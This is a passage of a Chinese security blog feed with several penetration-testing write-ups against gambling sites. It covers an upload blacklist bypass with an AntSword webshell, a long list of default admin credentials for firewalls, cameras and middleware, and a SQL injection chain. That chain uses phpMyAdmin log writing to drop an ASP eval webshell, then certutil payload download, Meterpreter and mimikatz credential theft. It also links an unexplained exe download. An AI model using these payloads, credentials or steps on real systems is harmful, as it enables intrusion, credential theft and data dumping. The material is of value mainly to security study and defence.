title="总结"></a>总结</h1><p>本来还想加一个爬虫模块进去的，但是作者有自己的爬虫模块，就算了，如果可以的话，也可以把一些优秀的开源爬虫加进去，就真的很nice了，我以后再加把，先这样吧，运行有什么问题可以及时联系我，越改越实用。<br>挺香的！真香，找个机会把源码放到github上面去：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1132015684.png"></p><p>exe程序百度云链接:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;17WIa94fr5EAHgfo4UI6Eyw </span><br><span class="line">提取码：qq0c </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具推送 </tag>
            
            <tag> JSFinder </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从代码审计到拿下某菠菜客服站</title>
      <link href="2021/01/09/%E4%BB%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%B0%E6%8B%BF%E4%B8%8B%E6%9F%90%E8%8F%A0%E8%8F%9C%E5%AE%A2%E6%9C%8D%E7%AB%99/"/>
      <url>2021/01/09/%E4%BB%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%B0%E6%8B%BF%E4%B8%8B%E6%9F%90%E8%8F%A0%E8%8F%9C%E5%AE%A2%E6%9C%8D%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<h2 id="起-因"><a href="#起-因" class="headerlink" title="起 因"></a>起 因</h2><p>给的目标只有一个后台系统登陆页面。上去就是一个弱口令怼他，但这种菠菜站基本不可能。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/974311650.png"></p><p>这时候就要体现信息搜集的重要性了，毕竟渗透最重要的就是信息搜集，废话也不多说，这个过程有点漫长，直接上主菜吧</p><h2 id="正-文"><a href="#正-文" class="headerlink" title="正 文"></a>正 文</h2><p>利用fofa、shdan、微步、超级ping进行域名查ip，以及ip反查域名。得到其中一个客服站</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/888658809.png"></p><p>该站有存储型xss，打进去后返回的全是安卓手机，遂放弃。直接套客服话，有点久远这里就没得图了，通过客服给出的信息，直接批量扫c端同宝塔端口。再ip反查域名得到另一客服站</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1688670897.png"></p><p>通过目录扫描，发现有install.php文件。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1840589366.png"></p><p>好家伙，直接告诉了我是什么客服系统，google一搜，开源的，直接下下来审计一波。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2033182467.png"></p><p>放入seay自动审计一波，打开一看，经验多的一看就知道是thinkphp框架。根据安装教程，得知此系统需要绑定到public目录，根据thinkphp的路由规则，web能访问到的目录只有application了。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/60637078.png"></p><p>审计过程有点漫长，此处省略。直接上找到的漏洞函数。通过全局搜索upload，发现该函数存在一个黑名单过滤。该函数以文件名中的点来分割名字并存入数组中，且以数组的第二个为后缀。即当文件名为index.php时，$ext=php，但php在黑名单中;此时我们传入一个index.w.php文件，$ext=w，以此来绕过黑名单</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4038675987.png"></p><p>根据thinkphp的路由规则，该函数位于<code>application/admin/controller/Event.php</code>文件中，对应的web路径为<code>/admin/event/uploadimg</code></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4162863277.png"></p><p>我们可以构造一个本地的文件上传，并用burp抓包post到该路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;domain.doamin&#x2F;admin&#x2F;event&#x2F;uploadimg&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;label for&#x3D;&quot;file&quot;&gt;Filename:&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;editormd-image-file&quot; id&#x3D;&quot;editormd-image-file&quot;&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/486829852.png"></p><p>可以看到成功上传过去，此时用蚁剑连接，成功getshell。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1624874699.png"></p><p>进去一看，好家伙，一堆站点。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4096885800.png"></p><p>去执行命令是发现输入什么都返回ret=127,后面想起来宝塔的站基本都禁用了很多函数</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/951336023.png"></p><p>这里我们直接可以用蚁剑的disable_functions插件绕过执行命令限制</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2472236437.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/862372783.png"></p><h2 id="后-续"><a href="#后-续" class="headerlink" title="后 续"></a>后 续</h2><p>因为该机子为vps，内网不打，直接上了beef去探测管理员的真实ip，为之后的钓鱼做准备。</p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>弱口令，yyds</title>
      <link href="2021/01/08/%E5%BC%B1%E5%8F%A3%E4%BB%A4%EF%BC%8Cyyds/"/>
      <url>2021/01/08/%E5%BC%B1%E5%8F%A3%E4%BB%A4%EF%BC%8Cyyds/</url>
      
        <content type="html"><![CDATA[<h2 id="一些自己搜集的弱口令"><a href="#一些自己搜集的弱口令" class="headerlink" title="一些自己搜集的弱口令"></a>一些自己搜集的弱口令</h2><p>在渗透企业资产时，弱口令往往可达到出奇制胜，事半功倍的效果！特别是内网，那家伙，一个admin admin或者admin123 拿下一片，懂的都懂。</p><p>当你还在苦恼如何下手时，我却悄悄进了后台，getshell了</p><p>以下是我实战中，经常遇到的一些口令，希望大家记好笔记，弱口永远的0Day，文末有常用字典，和查询网站。</p><hr><h3 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h3><p>重所周知，tomcat有项目部署管理界面</p><p><a href="http://ip/">http://ip</a>:8080/host-manager/html</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1478672069.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户名：admin  密码：admin</span><br><span class="line">用户名：tomcat 密码：tomcat</span><br><span class="line">用户名：tomcat 密码：s3cret</span><br></pre></td></tr></table></figure><h3 id="Apache-axis2"><a href="#Apache-axis2" class="headerlink" title="Apache axis2"></a>Apache axis2</h3><p>axis2同样和tomcat有web控制台</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/304239293.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名：admin   密码：axis2</span><br></pre></td></tr></table></figure><h3 id="websphere"><a href="#websphere" class="headerlink" title="websphere"></a>websphere</h3><p>这个很少见，不过还是被我见到了<br>9080端口</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2966209192.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">system&#x2F;manager</span><br><span class="line">wasadmin&#x2F;wasadmin</span><br><span class="line">admin&#x2F;admin</span><br></pre></td></tr></table></figure><h3 id="MapZone-Server-Login"><a href="#MapZone-Server-Login" class="headerlink" title="MapZone Server Login"></a>MapZone Server Login</h3><p>MAPZONE Server 是公司自主开发的一套服务型GIS 平台产品,产品基于面向服务架构,提供数据服务发布、功能服务发布、外部服务聚合、定制化服务等功能</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3812486853.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MapZone&#x2F;MapZone</span><br></pre></td></tr></table></figure><h3 id="HIKVISION"><a href="#HIKVISION" class="headerlink" title="HIKVISION"></a>HIKVISION</h3><p>sese发抖的摄(se)像头<br>HIKVISION默认密码12345，但是安装的时候都会提示更改默认密码，这个只能靠运气</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/690458723.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4131629986.png"></p><h3 id="vmwarw-harbor"><a href="#vmwarw-harbor" class="headerlink" title="vmwarw harbor"></a>vmwarw harbor</h3><p>Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器，通过添加一些企业必需的功能特性，例如安全、标识和管理等</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1331409580.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">账号admin 密码Harbor12345</span><br></pre></td></tr></table></figure><h3 id="深信服设备"><a href="#深信服设备" class="headerlink" title="深信服设备"></a>深信服设备</h3><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3547885437.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3954805141.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">用户名：sangfor</span><br><span class="line">密码： sangfor</span><br><span class="line">      sangfor@2018</span><br><span class="line">      sangfor@2019</span><br><span class="line">      admin&#x2F;admin</span><br><span class="line">      admin&#x2F;空</span><br></pre></td></tr></table></figure><h3 id="华为设备"><a href="#华为设备" class="headerlink" title="华为设备"></a>华为设备</h3><h4 id="华为交换机"><a href="#华为交换机" class="headerlink" title="华为交换机"></a>华为交换机</h4><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/399654145.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户名：admin</span><br><span class="line">密码：admin@huawei</span><br><span class="line">密码：admin@huawei.com</span><br></pre></td></tr></table></figure><h4 id="华为USG2250"><a href="#华为USG2250" class="headerlink" title="华为USG2250"></a>华为USG2250</h4><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4850303.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x2F;Admin@123</span><br></pre></td></tr></table></figure><h3 id="zentao"><a href="#zentao" class="headerlink" title="zentao"></a>zentao</h3><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/300904352.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zentao 用户名：admin   密码：123456</span><br></pre></td></tr></table></figure><h3 id="Apache-ActiveMQ"><a href="#Apache-ActiveMQ" class="headerlink" title="Apache ActiveMQ"></a>Apache ActiveMQ</h3><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/137499804.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">未授权&#x2F;admin&#x2F;connections.jsp</span><br><span class="line">用户名：admin  密码：admin</span><br></pre></td></tr></table></figure><h3 id="zabbix"><a href="#zabbix" class="headerlink" title="zabbix"></a>zabbix</h3><p>某src真实遇到过，这是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案<br>更可反弹shell拿下权限哦</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1290740421.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名：admin   密码：zabbix</span><br></pre></td></tr></table></figure><h3 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h3><p>RabbitMQ是实现了高级消息队列协议（AMQP）的开源消息代理软件（亦称面向消息的中间件）</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/537590096.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">默认账号密码guest&#x2F;guest  admin&#x2F;admin</span><br></pre></td></tr></table></figure><h2 id="再奉上常见的弱口令查询网站（怎么叫弱口令勒？，应该叫默认密码和账号）："><a href="#再奉上常见的弱口令查询网站（怎么叫弱口令勒？，应该叫默认密码和账号）：" class="headerlink" title="再奉上常见的弱口令查询网站（怎么叫弱口令勒？，应该叫默认密码和账号）："></a>再奉上常见的弱口令查询网站（怎么叫弱口令勒？，应该叫默认密码和账号）：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HUAWEI 默认账号&#x2F;密码查询工具：</span><br><span class="line">https:&#x2F;&#x2F;support.huawei.com&#x2F;onlinetoolweb&#x2F;pqt&#x2F;index.jsp</span><br><span class="line">路由器密码社区数据库：</span><br><span class="line">http:&#x2F;&#x2F;www.routerpasswords.com</span><br><span class="line">默认路由器密码列表：</span><br><span class="line">https:&#x2F;&#x2F;portforward.com&#x2F;router-password&#x2F;</span><br><span class="line"></span><br><span class="line">然后就是百度，google了，好不好使，懂的都懂嗷</span><br></pre></td></tr></table></figure><p>再附上一波字典，大家直接复制粘贴保存吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">深信服产品  sangfor  sangfor sangfor@2018 sangfor@2019</span><br><span class="line">深信服科技 AD     dlanrecover</span><br><span class="line">深信服负载均衡 AD 3.6  admin  admin</span><br><span class="line">深信服WAC ( WNS V2.6)  admin  admin</span><br><span class="line">深信服VPN  Admin  Admin</span><br><span class="line">深信服ipsec-VPN (SSL 5.5)  Admin  Admin</span><br><span class="line">深信服AC6.0  admin  admin</span><br><span class="line">SANGFOR防火墙  admin  sangfor</span><br><span class="line">深信服AF(NGAF V2.2)  admin  sangfor</span><br><span class="line">深信服NGAF下一代应用防火墙(NGAF V4.3)  admin  admin</span><br><span class="line">深信服AD3.9  admin  admin</span><br><span class="line">深信服上网行为管理设备数据中心  Admin  密码为空</span><br><span class="line">SANGFOR_AD_v5.1  admin  admin</span><br><span class="line">网御漏洞扫描系统  leadsec  leadsec</span><br><span class="line">天阗入侵检测与管理系统 V7.0  Admin  venus70</span><br><span class="line">   Audit  venus70</span><br><span class="line">   adm  venus70</span><br><span class="line">天阗入侵检测与管理系统 V6.0  Admin  venus60</span><br><span class="line">   Audit  venus60</span><br><span class="line">   adm  venus60</span><br><span class="line">网御WAF集中控制中心(V3.0R5.0)  admin  leadsec.waf</span><br><span class="line">   audit  leadsec.waf</span><br><span class="line">   adm  leadsec.waf</span><br><span class="line">联想网御  administrator  administrator</span><br><span class="line">网御事件服务器  admin  admin123</span><br><span class="line">联想网御防火墙PowerV  administrator  administrator</span><br><span class="line">联想网御入侵检测系统  lenovo  default</span><br><span class="line">网络卫士入侵检测系统  admin  talent</span><br><span class="line">网御入侵检测系统V3.2.72.0  adm  leadsec32</span><br><span class="line">   admin  leadsec32</span><br><span class="line">联想网御入侵检测系统IDS  root  111111</span><br><span class="line">   admin  admin123</span><br><span class="line">科来网络回溯分析系统  csadmin  colasoft</span><br><span class="line">中控考勤机web3.0  administrator  123456</span><br><span class="line">H3C iMC  admin  admin</span><br><span class="line">H3C SecPath系列  admin  admin</span><br><span class="line">H3C S5120-SI  test  123</span><br><span class="line">H3C智能管理中心  admin  admin</span><br><span class="line">H3C ER3100  admin  adminer3100</span><br><span class="line">H3C ER3200  admin  adminer3200</span><br><span class="line">H3C ER3260  admin  adminer3260</span><br><span class="line">H3C  admin  adminer</span><br><span class="line">   admin  admin</span><br><span class="line">   admin  h3capadmin</span><br><span class="line">   h3c  h3c</span><br><span class="line">360天擎  admin  admin</span><br><span class="line">网神防火墙  firewall  firewall</span><br><span class="line">天融信防火墙NGFW4000  superman  talent</span><br><span class="line">黑盾防火墙  admin  admin</span><br><span class="line">   rule  abc123</span><br><span class="line">   audit  abc123</span><br><span class="line">华为防火墙  telnetuser  telnetpwd</span><br><span class="line">   ftpuser  ftppwd</span><br><span class="line">方正防火墙  admin  admin</span><br><span class="line">飞塔防火墙  admin  密码为空</span><br><span class="line">Juniper_SSG__5防火墙  netscreen  netscreen</span><br><span class="line">中新金盾硬件防火墙  admin  123</span><br><span class="line">kill防火墙(冠群金辰)  admin  sys123</span><br><span class="line">天清汉马USG防火墙  admin  venus.fw</span><br><span class="line">   Audit  venus.audit</span><br><span class="line">   useradmin  venus.user</span><br><span class="line">阿姆瑞特防火墙  admin  manager</span><br><span class="line">山石网科  hillstone  hillstone</span><br><span class="line">绿盟安全审计系统  weboper  weboper</span><br><span class="line">   webaudit  webaudit</span><br><span class="line">   conadmin  conadmin</span><br><span class="line">   admin  admin</span><br><span class="line">   shell  shell</span><br><span class="line">绿盟产品     nsfocus123</span><br><span class="line">TopAudit日志审计系统  superman  talent</span><br><span class="line">LogBase日志管理综合审计系统  admin  safetybase</span><br><span class="line">网神SecFox运维安全管理与审计系统  admin  !1fw@2soc#3vpn</span><br><span class="line">天融信数据库审计系统  superman  telent</span><br><span class="line">Hillstone安全审计平台  hillstone  hillstone</span><br><span class="line">网康日志中心  ns25000  ns25000</span><br><span class="line">网络安全审计系统（中科新业）  admin  123456</span><br><span class="line">天玥网络安全审计系统  Admin  cyberaudit</span><br><span class="line">明御WEB应用防火墙  admin  admin</span><br><span class="line">   admin  adminadmin</span><br><span class="line">明御攻防实验室平台  root  123456</span><br><span class="line">明御安全网关  admin  adminadmin</span><br><span class="line">明御运维审计与册风险控制系统  admin  1q2w3e</span><br><span class="line">   system  1q2w3e4r</span><br><span class="line">   auditor  1q2w3e4r</span><br><span class="line">   operator  1q2w3e4r</span><br><span class="line">明御网站卫士  sysmanager  sysmanager888</span><br><span class="line">亿邮邮件网关  eyouuser  eyou_admin</span><br><span class="line">   eyougw  admin@(eyou)</span><br><span class="line">   admin  +-ccccc</span><br><span class="line">   admin  cyouadmin</span><br><span class="line">Websense邮件安全网关  administrator  admin</span><br><span class="line">梭子鱼邮件存储网关  admin  admin</span><br></pre></td></tr></table></figure><p>弱口令好不好用，谁用谁知道啊，实在不行，top1000密码字典跑一波，跑不出来就算了！你这站不日也罢，大家都讲究佛系日站，命里有就有，没就没!</p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 弱口令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次菠菜站对护卫神的利用</title>
      <link href="2020/12/31/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8F%A0%E8%8F%9C%E7%AB%99%E5%AF%B9%E6%8A%A4%E5%8D%AB%E7%A5%9E%E7%9A%84%E5%88%A9%E7%94%A8/"/>
      <url>2020/12/31/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8F%A0%E8%8F%9C%E7%AB%99%E5%AF%B9%E6%8A%A4%E5%8D%AB%E7%A5%9E%E7%9A%84%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>因为这个站是几个月前日的了，所以图片可能不全，也没办法再补图。<br>写这篇文章的时候，隔壁情侣正在鼓掌，声音贼响，导致我写的东西可能没有过一遍脑子，写的可能有点混乱。另外值得一提的是，为啥我们做安全的经常隔壁碰到这种人？</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/531912594.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2914407144.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3369175273.png"></p><p>已知目标网站</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2089622478.png"></p><p>之前客户有给过这种网站，所以我记忆尤深，针对这种站一般你可以直接放弃正常测试流程了，因为经验告诉我，网站主站功能基本上很少有漏洞的，只能从旁站下手。</p><p>Ctrl+u查看一波没发现有什么存在泄漏的js，回过头发现发现网站右上角有个优惠活动大厅</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1558716760.png"></p><p>打开后页面似曾相识</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3329498645.png"></p><p>随便点开一个活动，好像可以随便提交文字，没有过滤，我信心满满输入xss，提交，然而两天过去了，并没什么叼用，我当时的心情真是像云像雾又像雨。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4285896928.png"></p><p>然而我又发现下面有个审核进度查询，打开后会让你输入用户名，既然有输入用户名，那应该就是有带入数据库查询，习惯性加了个’点击查询，10秒过去了，没响应，我懵了，输入正常不存在的账号测试，是会弹出记录的，但是加单引号查询却一点响应都没有。<br>F12-network抓包，发现是有发送请求的，很明显了，有注入，而且报错是页面是thinkphp，从最下角看版本是3.2.3，这个版本真的是hc的最爱，从色情到贷款平台，再到菠菜都是这个版本的thinkphp。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2361887523.png"></p><p>先注入一波试试</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2325183407.png"></p><p>抓包Sqlmap一波拿到了管理员账号密码，突然我意识到，我没有后台地址，拿到了也没叼用。<br>Fofa一波得到真实ip，发现999端口存在phpmyadmin服务，6588有一个标题为护卫神丶主机大师的asp站。目录爆破，端口扫描，子域名挖掘，都没有找到后台地址。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3106152376.png"></p><p>Os-shell成功，但是不管我输入什么都没反应。<br>Sql-shell也一样，仔细观察发现，网站路径是装在护卫神的。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3277388445.png"></p><p>有可能是护卫神拦截了，当时我还疑惑，这php的站，你用护卫神是什么意思。</p><p>等到十分钟后百度了一下hwshostmaster，我才知道我是多么无知，原来护卫神不是光有waf，他还有一个叫主机大师的服务，大概功能与phpstudy相同。</p><p>本地安装观察，发现主机大师默认安装后会在999端口启动phpmyadmin，6588端口则启动主机大师默认的管理页面，与我观察的目标ip端口一致。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/8790396.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1046154199.png"></p><p>既然目标站有phpmyadmin，那我就可以尝试使用sqlmap枚举一下对方数据库账号与密码hash。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sqlmap –r sql.txt --string&#x3D;&quot;Surname&quot; --users --password</span><br></pre></td></tr></table></figure><p>Sqlmap枚举出来了root与test，root的密码没有破解出来，但是test的密码破解出来为1234。登陆成功。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/24135875.png"></p><p>关于这种情况拿shell，木神的黑白天公众号里有篇文章&lt;phpMyAdmin 渗透利用总结&gt;已经写的很详细了，木神看到这篇文章麻烦找我结一下广告费。</p><p>mysql数据库getshell一般有两种方法，into outfile，导出日志。<br>根据注入报错页面的文件地址</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2477573225.png"></p><p>构造语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 into outfile &#39;D:&#x2F;wwwroot&#x2F;xxx.com&#x2F;web&#x2F;1.txt&#39;</span><br></pre></td></tr></table></figure><p>报错<code>#1 - Can&#39;t create/write to file</code>，应该是没有权限<br>尝试使用日志写入，先开启日志，然后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global  general_log_file &#x3D;&quot; D:\\wwwroot\\xxx.com\\web\\a.php&quot;</span><br></pre></td></tr></table></figure><p>好像还是不行，我裂开了。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/815342482.png"></p><p>突然我想到，既然这个wwwroot目录没有权限，那么护卫神主机大师管理页面是否可以利用一下呢 ，翻了一下本地安装的主机大师文件，可以确认主机大师的管理页面绝对路径是D:Hws.comHwsHostMasterhostweb</p><p>尝试修改日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set global  general_log_file &#x3D;&quot; D:\\Hws.com\\HwsHostMaster\\host\\web\\1.asp&quot;</span><br></pre></td></tr></table></figure><p>成功。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2621937424.png"></p><p>然后执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select “&lt;%eval request(&quot;chopper&quot;)%&gt;”</span><br></pre></td></tr></table></figure><p>访问<code>http://xxx.xxx.xxx.xxx:6588/1.asp</code>报错404，这个问题难了我好久，后来我才发现，需要把日志文件换成其他的，当前日志文件才可以访问。<br>Cknife连接成功</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2033555554.png"></p><p>Whoami发现是system权限，那么剩下的就简单了，为了防止护卫神查杀，生成了个msf免杀马，通过certutil下载，然后执行，msf上线，然后迁移进程，load mimikatz，一套下来拿到了远程账号密码，脱裤打包源码，提交给客户，完事。</p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows提权看这一篇就够了</title>
      <link href="2020/12/30/windows%E6%8F%90%E6%9D%83%E7%9C%8B%E8%BF%99%E4%B8%80%E7%AF%87%E5%B0%B1%E5%A4%9F%E4%BA%86/"/>
      <url>2020/12/30/windows%E6%8F%90%E6%9D%83%E7%9C%8B%E8%BF%99%E4%B8%80%E7%AF%87%E5%B0%B1%E5%A4%9F%E4%BA%86/</url>
      
